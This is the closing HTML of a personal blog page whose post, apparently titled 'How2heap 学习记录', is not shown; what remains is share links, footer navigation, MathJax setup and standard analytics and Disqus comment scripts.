  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=How2heap 学习记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&name=How2heap 学习记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 1nv0k3r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-131778492-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?da32760b25f029bfe0c4abfc646f5f7a";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'blog-tw5j2p4htr';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


